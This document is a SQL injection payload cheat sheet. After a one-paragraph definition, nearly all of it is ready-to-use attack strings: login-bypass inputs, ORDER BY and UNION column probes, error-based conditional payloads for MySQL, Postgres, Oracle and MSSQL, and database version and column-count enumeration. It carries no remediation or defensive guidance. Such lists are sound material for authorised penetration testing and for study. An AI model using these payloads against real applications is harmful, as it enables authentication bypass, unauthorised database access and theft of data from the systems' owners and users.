# SQL Injection

SQL injection (SQLi) is a type of security flaw in applications that enables attackers to manipulate the database of an application. This vulnerability can lead to unauthorized data access, deletion, or alteration, and can cause the application to behave in unintended ways. It works by deceiving the application into executing malicious SQL statements that the attacker has embedded into input fields that are poorly secured or not sanitized.

**Authentication Based Payloads**

```
or true--
```
```
") or true--
```
```
') or true--
```
```
admin') or ('1'='1'--
```
```
admin') or ('1'='1'#
```
```
admin') or ('1'='1'/
```

**Order by and UNION Based Payloads**

```
1' ORDER BY 1--+
```
```
1' ORDER BY 2--+
```
```
1' ORDER BY 3--+
```
```
1' ORDER BY 1,2--+
```
```
1' ORDER BY 1,2,3--+
```
```
1' GROUP BY 1,2,--+
```
```
1' GROUP BY 1,2,3--+
```
```
' GROUP BY columnnames having 1=1 --
```
```
-1' UNION SELECT 1,2,3--+
```
```
' UNION SELECT sum(columnname ) from tablename --
```
```
-1 UNION SELECT 1 INTO @,@
```
```
-1 UNION SELECT 1 INTO @,@,@
```
```
1 AND (SELECT * FROM Users) = 1	
```
```
' AND MID(VERSION(),1,1) = '5';
```
```
' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
```

**Generic Error Based Payloads**

MySQL
```
' UNION SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') -- -
```
Postgres
```
' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END -- -
```
Oracle
```
' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual -- -
```
MSSQL
```
' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END -- -
```

**Database enumeration**

MySQL/MSSQL
```
' UNION SELECT @@version -- -
```
Oracle
```
' UNION SELECT banner from v$version -- -
```
Oracle(2nd method)
```
' UNION SELECT version from v$instance -- -
```
Postgres
```
' UNION SELECT version() -- -
```

**Number of column**

MySQL/MSSQL/PGSQL
```
'UNION SELECT NULL,NULL,NULL -- -
```
ORACLE
```
'UNION SELECT NULL,NULL,NULL FROM DUAL -- -
```
MYSQL/MSSQL/PGSQL/ORACLE
```
' UNION ORDER BY 1 -- -
```
